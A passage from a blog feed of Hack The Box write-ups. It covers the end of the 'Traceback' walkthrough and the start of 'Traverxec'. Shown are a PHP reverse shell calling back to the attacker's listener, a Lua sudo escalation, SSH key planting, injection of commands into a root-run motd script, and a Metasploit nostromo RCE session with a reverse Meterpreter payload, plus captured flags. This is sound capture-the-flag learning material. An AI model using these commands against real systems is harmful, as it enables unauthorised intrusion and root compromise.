|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
&lt;span class=&quot;go&quot;&gt;
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.35 seconds

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The only open ports on the machine are &lt;strong&gt;22&lt;/strong&gt; and &lt;strong&gt;80&lt;/strong&gt;. These are all we’ll need to proceed through the rest of the box. so let’s take a look at what’s on the web port.&lt;/p&gt;

&lt;h3 id=&quot;port-80&quot;&gt;Port 80&lt;/h3&gt;
&lt;p&gt;Browsing to the website we can see that it’s been defaced, and apparently they’ve left a backdoor somewhere.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/port80.png&quot; alt=&quot;port80&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 1:&lt;/strong&gt; This site has been owned by Xh4H.&lt;/p&gt;

&lt;p&gt;Looking at the source code of the defaced page we find an HTML comment that indicates this backdoor is a webshell of some sort.&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;This site has been owned&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;h2&amp;gt;&lt;/span&gt;I have left a backdoor for all the net. FREE INTERNETZZZ&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;nt&quot;&gt;&amp;lt;h3&amp;gt;&lt;/span&gt; - Xh4H - &lt;span class=&quot;nt&quot;&gt;&amp;lt;/h3&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;c&quot;&gt;&amp;lt;!--Some of the best web shells that you might need ;)--&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;osint&quot;&gt;OSINT&lt;/h3&gt;
&lt;p&gt;After searching for &lt;em&gt;Xh4H&lt;/em&gt; on Google, the first hit is a &lt;a href=&quot;https://github.com/Xh4H/&quot;&gt;GitHub profile&lt;/a&gt;. Browsing through his repositories a bit there’s one called &lt;a href=&quot;https://github.com/Xh4H/Web-Shells&quot;&gt;Web-Shells&lt;/a&gt; which he’s forked from another repository.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/web-shells.png&quot; alt=&quot;web-shells&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 2:&lt;/strong&gt; Xh4H’s Web-Shells repository.&lt;/p&gt;

&lt;p&gt;There are 16 different shells in this repo, 15 of which are &lt;em&gt;php&lt;/em&gt; shells.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;
&lt;h2 id=&quot;initial-foothold&quot;&gt;Initial foothold&lt;/h2&gt;
&lt;p&gt;Trying each shell in the repository we eventually find that &lt;code class=&quot;highlighter-rouge&quot;&gt;http:10.10.10.181/smevk.php&lt;/code&gt; is the backdoor. This is the second to last shell in the repository.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/smevk_login_page.png&quot; alt=&quot;smevk_login_page&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 3:&lt;/strong&gt; We found the backdoor, but it’s closed.&lt;/p&gt;

&lt;p&gt;There’s a login page to &lt;code class=&quot;highlighter-rouge&quot;&gt;smevk&lt;/code&gt;, but it turns out that the credentials are simply &lt;code class=&quot;highlighter-rouge&quot;&gt;admin:admin&lt;/code&gt;. That was my first guess.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/smevk_logged_in.png&quot; alt=&quot;smevk_logged_in&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 4:&lt;/strong&gt; We’re in through the backdoor.&lt;/p&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
&lt;p&gt;I’m a n00b, so I haven’t used many web shells besides &lt;code class=&quot;highlighter-rouge&quot;&gt;c99&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;p0wny&lt;/code&gt;. As I explored the features of &lt;code class=&quot;highlighter-rouge&quot;&gt;smevk&lt;/code&gt; I came to find some of them quite useful. The menu includes &lt;em&gt;Sec. Info&lt;/em&gt;, &lt;em&gt;Files&lt;/em&gt;, &lt;em&gt;Console&lt;/em&gt;, &lt;em&gt;Bypasser&lt;/em&gt;, &lt;em&gt;Safe Mode&lt;/em&gt;, &lt;em&gt;String tools&lt;/em&gt;, &lt;em&gt;Import Scripts&lt;/em&gt;, &lt;em&gt;Network&lt;/em&gt;, &lt;em&gt;Readable Dirs&lt;/em&gt;, &lt;em&gt;Defacer&lt;/em&gt;, &lt;em&gt;Code Injector&lt;/em&gt;, &lt;em&gt;Domains&lt;/em&gt;, and  &lt;em&gt;logout button&lt;/em&gt;. A lot of these features seemed neat but the only ones I really utilized are the file explorer and the file uploader.&lt;/p&gt;

&lt;p&gt;Navigating directly to the &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory we see two users &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;webadmin&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/home_directory.png&quot; alt=&quot;home_directory&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 5:&lt;/strong&gt; The &lt;code class=&quot;highlighter-rouge&quot;&gt;/home&lt;/code&gt; directory shows two users.&lt;/p&gt;

&lt;p&gt;In this case we’re logged in as &lt;code class=&quot;highlighter-rouge&quot;&gt;webadmin&lt;/code&gt;, and don’t have access to the &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; directory. The flag  doesn’t appear to be in our &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/webadmin&lt;/code&gt; directory, but other useful things definitely are (&lt;code class=&quot;highlighter-rouge&quot;&gt;note.txt&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt;).&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/home_webadmin.png&quot; alt=&quot;home_webadmin&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 6:&lt;/strong&gt; Some interesting files in our home directory, but not flag.&lt;/p&gt;

&lt;p&gt;Exploring the &lt;code class=&quot;highlighter-rouge&quot;&gt;note.txt&lt;/code&gt; file we can see it mentions that there’s Lua installed on the box for us to “practice” with.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/note.png&quot; alt=&quot;note&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 7:&lt;/strong&gt; Contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;note.txt&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Initially I thought that the &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; may have been a spoiler left by another user. I realize now though that we’re supposed to find it, and “trace back the steps” of the initial exploitation.  &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; tells us very explicitly where Lua is, and how to execute it as the &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; user. We simply need to create the &lt;code class=&quot;highlighter-rouge&quot;&gt;privesc.lua&lt;/code&gt; file ourself as it appears to have been removed after execution.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/what.png&quot; alt=&quot;what&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 8:&lt;/strong&gt; The contents of &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; are basically a guide to getting the user flag.&lt;/p&gt;

&lt;p&gt;We need only to look at &lt;a href=&quot;https://gtfobins.github.io/gtfobins/lua/&quot;&gt;GTFO Bins Lua section&lt;/a&gt; to determine the syntax to launch a shell in Lua, something like &lt;code class=&quot;highlighter-rouge&quot;&gt;os.execute(&quot;/bin/sh&quot;)&lt;/code&gt; will work.&lt;/p&gt;

&lt;p&gt;To create our Lua script and launch it for a privilege escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; we’re going to need a reverse shell on the machine. To do this we’ll launch a netcat listener via &lt;code class=&quot;highlighter-rouge&quot;&gt;nc -lvp 4444&lt;/code&gt; and upload a php revers shell named &lt;code class=&quot;highlighter-rouge&quot;&gt;x.php&lt;/code&gt;. Navigating to &lt;code class=&quot;highlighter-rouge&quot;&gt;http:10.10.10.181/x.php&lt;/code&gt; with trigger the reverse shell to call back to us.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/shell_upload.png&quot; alt=&quot;shell_upload&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 9:&lt;/strong&gt; Uploading &lt;code class=&quot;highlighter-rouge&quot;&gt;x.php&lt;/code&gt;, our reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lvp&lt;/span&gt; 4444
&lt;span class=&quot;go&quot;&gt;listening on [any] 4444 ...
connect to [10.10.15.38] from traceback.htb [10.10.10.181] 47416
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Linux traceback 4.15.0-58-generic #&lt;/span&gt;64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
&lt;span class=&quot;go&quot;&gt; 11:44:37 up  1:45,  0 users,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;/bin/sh: 0: can't access tty;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;job control turned off
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;   
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we’ve got the reverse shell going we’ll create the Lua file next and execute it for privilege escalation to &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;os.execute('/bin/bash')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; privesc.lua
&lt;span class=&quot;gp&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; sysadmin /home/sysadmin/luvit privesc.lua
&lt;span class=&quot;go&quot;&gt;sh: turning off NDELAY mode
whoami
sysadmin
cd /home/sysadmin
cat user.txt
82f71c69e2692140bd21f923d0707f05
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;root-flag&quot;&gt;Root Flag&lt;/h2&gt;
&lt;p&gt;Before we start trying to escalate privileges to root we’re going to get a proper ssh session going on the box so that we don’t have to work within this reverse shell. To do so we’ll simply add our public key to &lt;code class=&quot;highlighter-rouge&quot;&gt;/home/sysadmin/.ssh/authorized_keys&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCx7eDPx1R6wLygP7rzBH7L0PdPeMbZU1pyFpOJN45DuXiaor1bx2DksSKwNNPI7TiiTTNWplVdDGcW4p/ISVOoXLEP0W99QH8MB57HnMFShpuhNNJCCfhfLS1FEfD+iApR3RTZXnv13SBb/gLq21idHfBMes6A7Ba9Eba2gBbeWoIBF27PDXZER076r6LGHFdjHWFMJrdMOPDqdzYefBIVkGgbHqVRb0bd7IKi6NEMcAzL12BYnmIAXnJ789L+qDxGRam3hcImhV2mHpXpNJaunj9AUydxHgaKMY97x9REND2YGBPiCowb60qQTwDtIKfTEsAUOxJ6vQWVbdkxEsOr4HDe8azY30pL9vBjv8DT0rvC7ndVfy+maZ33sb/tvsVm5cw8mJZRnB/SEkHn4atDwR2CiX/FlWSmCV8s90bKBcRgJyW5+z7MyBTJ95g5hgGOpk20JEyl+P+EyZEai7l4j5ToCYnfmCX0ZdR3XNT3yI8oweCiRraHeiaqnn3Guxk= root@kali
&quot; &amp;gt;&amp;gt; ~/.ssh/authorized_keys
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we’ll ssh back into the box as &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/ssh_in_user.png&quot; alt=&quot;ssh_in_user&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 10:&lt;/strong&gt; ssh’ing back in as &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; and launching bash.&lt;/p&gt;

&lt;p&gt;To monitor the running processes we’ll download &lt;a href=&quot;https://github.com/DominicBreuker/pspy&quot;&gt;pspy&lt;/a&gt; from our Kali box’s Apache server into the &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; directory of the machine.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-Console&quot;&gt;sysadmin@traceback:~$ cd /tmp
sysadmin@traceback:/tmp$ wget http://10.10.15.38/pspy64
--2020-04-10 12:40:27--  http://10.10.15.38/pspy64
Connecting to 10.10.15.38:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M)
Saving to: ‘pspy64’

pspy64                              100%[=================================================================&amp;gt;]   2.94M   808KB/s    in 4.9s    

2020-04-10 12:40:32 (611 KB/s) - ‘pspy64’ saved [3078592/3078592]

sysadmin@traceback:/tmp$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Launching it we can see that &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/.update-motd.d/&lt;/code&gt; is being replaced about every 30 seconds. When we ssh’d into the box it was clear that this has been modified by the attacker previously. &lt;strong&gt;Welcome to Xh4H land&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/pspy.png&quot; alt=&quot;pspy&quot; /&gt;
&lt;strong&gt;Figure 11:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/.update-motd.d&lt;/code&gt; being overwritten every 30 seconds from a backup directory.&lt;/p&gt;

&lt;p&gt;We have permission as the &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; user to modify these files, and in doing so we can execute code as root.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d$ ls -lah
total 32K
drwxr-xr-x  2 root sysadmin 4.0K Aug 27  2019 .
drwxr-xr-x 80 root root     4.0K Mar 16 03:55 ..
-rwxrwxr-x  1 root sysadmin  981 Apr 10 12:47 00-header
-rwxrwxr-x  1 root sysadmin  982 Apr 10 12:47 10-help-text
-rwxrwxr-x  1 root sysadmin 4.2K Apr 10 12:47 50-motd-news
-rwxrwxr-x  1 root sysadmin  604 Apr 10 12:47 80-esm
-rwxrwxr-x  1 root sysadmin  299 Apr 10 12:47 91-release-upgrade
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We’ll modify the &lt;code class=&quot;highlighter-rouge&quot;&gt;00-header&lt;/code&gt; file to copy the &lt;code class=&quot;highlighter-rouge&quot;&gt;sysadmin&lt;/code&gt; user’s &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; file into the &lt;code class=&quot;highlighter-rouge&quot;&gt;authorized_keys&lt;/code&gt; file of the &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; user.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sysadmin@traceback:/etc/update-motd.d$ echo &quot;ls -lah /root/.ssh &amp;amp;&amp;amp; cat /home/sysadmin/.ssh/authorized_keys &amp;gt;&amp;gt; /root/.ssh/authorized_keys &amp;amp;&amp;amp; cat /root/.ssh/authorized_keys&quot; &amp;gt;&amp;gt; 00-header
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once we’ve done this, we quickly need to ssh into the box again before the &lt;code class=&quot;highlighter-rouge&quot;&gt;00-header&lt;/code&gt; file is overwritten by the backup. If we do this quickly enough, our new login will trigger the code we’ve placed into &lt;code class=&quot;highlighter-rouge&quot;&gt;00-header&lt;/code&gt; to be executed, and our &lt;code class=&quot;highlighter-rouge&quot;&gt;id_rsa.pub&lt;/code&gt; is copied into &lt;code class=&quot;highlighter-rouge&quot;&gt;/root/.ssh/authorized_keys&lt;/code&gt;. Now we can ssh into the box as root and grab the flag.&lt;br /&gt;
&lt;strong&gt;Note:&lt;/strong&gt; Yes we could have just placed &lt;code class=&quot;highlighter-rouge&quot;&gt;cat /root/root.txt&lt;/code&gt; into the &lt;code class=&quot;highlighter-rouge&quot;&gt;00-header&lt;/code&gt; and gotten the flag that way, but getting a root shell is much more satisfying.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/08/traceback/rooted.png&quot; alt=&quot;rooted&quot; /&gt;&lt;br /&gt;
&lt;strong&gt;Figure 12:&lt;/strong&gt; f1af5eb9875c8514dbb32168383cfd52&lt;/p&gt;

&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;This box was fairly easy, which was nice because it’s rated as such. I enjoyed the theme of it, another hacker has compromised the machine and left messages around. Getting the user flag was really straight forward given the &lt;code class=&quot;highlighter-rouge&quot;&gt;.bash_history&lt;/code&gt; file telling us exactly what to do. The path to root was extremely similar to the &lt;a href=&quot;https://ryankozak.com/hack-the-box-writeup-4-writeup/&quot;&gt;Writeup&lt;/a&gt; box, and because of that it was kind of a breeze. It was quick and fairly fun, and that’s it.&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/Xh4H/Web-Shells&quot;&gt;Xh4H’s Web-Shells&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php&quot;&gt;Pentest Monkey’s PHP Reverse Shell&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://gtfobins.github.io/gtfobins/lua/&quot;&gt;GTFO Bins Lua&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>Ryan Kozak</name></author><category term="CTF Writeup" /><category term="Security" /><category term="CTF" /><category term="Hack The Box" /><category term="Linux" /><summary type="html"></summary></entry><entry><title type="html">Hack The Box - Traverxec</title><link href="http://0.0.0.0:4000/hack-the-box-craft-traverxec/" rel="alternate" type="text/html" title="Hack The Box - Traverxec" /><published>2020-04-12T00:00:00+00:00</published><updated>2021-06-23T16:11:24+00:00</updated><id>http://0.0.0.0:4000/hack-the-box-traverxec</id><content type="html" xml:base="http://0.0.0.0:4000/hack-the-box-craft-traverxec/">&lt;p&gt;&lt;img src=&quot;/wp-content/uploads/2020/04/traverxec/badge.png&quot; alt=&quot;Hack The Box Haystack&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Traverxec is an easy box worth 20 points, hosted on &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.165&lt;/code&gt;. As we will see the name is indicative of the vulnerability we’ll leverage to gain our initial foothold. Despite having had difficulty with a few steps, when it’s all said and done the box is rather simple. This writeup is a short one because of that.&lt;/p&gt;

&lt;h1 id=&quot;information-gathering&quot;&gt;Information Gathering&lt;/h1&gt;
&lt;p&gt;As always, we’ll add the IP of the box to our &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; file. So, from here on out &lt;code class=&quot;highlighter-rouge&quot;&gt;traverxec.htb&lt;/code&gt; points to &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.165&lt;/code&gt;.&lt;/p&gt;

&lt;h2 id=&quot;port-scan-nmap&quot;&gt;Port Scan: Nmap&lt;/h2&gt;
&lt;p&gt;We begin our reconnaissance by running a port scan with Nmap, checking default scripts and testing for vulnerabilities.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/media/sf_Research#&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sVC&lt;/span&gt; traverxec.htb
&lt;span class=&quot;go&quot;&gt;Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-12 15:40 EST
Nmap scan report for traverxec.htb (10.10.10.165)
Host is up (0.84s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|_  256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
80/tcp open  http    nostromo 1.9.6
|_http-server-header: nostromo 1.9.6
|_http-title: TRAVERXEC
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Service Info: OS: Linux;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;CPE: cpe:/o:linux:linux_kernel
&lt;span class=&quot;go&quot;&gt;
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 196.10 seconds
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The most important thing to notice here is that the web server running on this box is &lt;strong&gt;nostromo 1.9.6&lt;/strong&gt;. Running a quick search for known vulnerabilities we find &lt;a href=&quot;https://www.cvedetails.com/cve/CVE-2019-16278/&quot;&gt;CVE-2019-16278&lt;/a&gt;, which is a remote code execution bug.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Given the name of this box, we’re certainly going to be exploiting this to gain our initial foothold.&lt;/p&gt;

&lt;h1 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h1&gt;

&lt;h2 id=&quot;foothold&quot;&gt;Foothold&lt;/h2&gt;

&lt;p&gt;We can use Metasploit’s module for &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/pull/12476&quot;&gt;CVE-2019-16278&lt;/a&gt; and get a Meterpreter session on the box.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~# msfconsole
[-] ***
                                                  

         .                                         .
 .

      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
       '   dB'                     BBP
    dB'dB'dB' dBBP     dBP     dBP BB
   dB'dB'dB' dBP      dBP     dBP  BB
  dB'dB'dB' dBBBBP   dBP     dBBBBBBB

                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
          .                  .                  dB' dBP    dB'.BP
                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP
                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP
                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP

                                                                    .
                .
        o                  To boldly go where no
                            shell has gone before


       =[ metasploit v5.0.58-dev                          ]
+ -- --=[ 1936 exploits - 1079 auxiliary - 333 post       ]
+ -- --=[ 556 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

msf5 &amp;gt; set RHOSTS traverxec.htb
RHOSTS =&amp;gt; traverxec.htb
msf5 &amp;gt; set LPORT 80
LPORT =&amp;gt; 80
msf5 &amp;gt; use exploit/multi/http/nostromo_code_exec
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; set LHOST 10.10.15.60
LHOST =&amp;gt; 10.10.15.60
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; set LPORT 1337
LPORT =&amp;gt; 1337
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; set payload linux/x86/meterpreter/reverse_tcp
payload =&amp;gt; linux/x86/meterpreter/reverse_tcp
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; set target 1
target =&amp;gt; 1
msf5 exploit(multi/http/nostromo_code_exec) &amp;gt; run

[*] Started reverse TCP handler on 10.10.15.60:1337 
[*] Configuring Automatic (Linux Dropper) target
[*] Sending linux/x64/meterpreter/reverse_tcp command stager
[*] Sending stage (3021284 bytes) to 10.10.10.165
[*] Command Stager progress - 100.00% done (823/823 bytes)
[*] Meterpreter session 1 opened (10.10.15.60:1337 -&amp;gt; 10.10.10.165:47402) at 2019-12-17 13:27:54 -0500

meterpreter &amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;user-flag&quot;&gt;User Flag&lt;/h2&gt;
&lt;p&gt;After some manual exploration we find some interesting content inside of the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/nostromo/conf&lt;/code&gt; directory. There’s an &lt;code class=&quot;highlighter-rouge&quot;&gt;.htpasswd&lt;/code&gt; file, but we don’t need to use that, at least not the way we’re going about this. What’s interesting in this directory is the configuration file, &lt;code class=&quot;highlighter-rouge&quot;&gt;nhttpd.conf&lt;/code&gt;, which indicates the existence of another folder we need to take a look at.&lt;/p&gt;

&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /var/nostromo/conf
&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;Listing: /var/nostromo/conf
===========================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100644/rw-r--r--  41    fil   2019-10-25 15:20:50 -0400  .htpasswd
100644/rw-r--r--  2928  fil   2019-10-25 14:43:20 -0400  mimes
100644/rw-r--r--  498   fil   2019-10-27 16:12:13 -0400  nhttpd.conf

&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;meterpreter &amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;nhttpd.conf
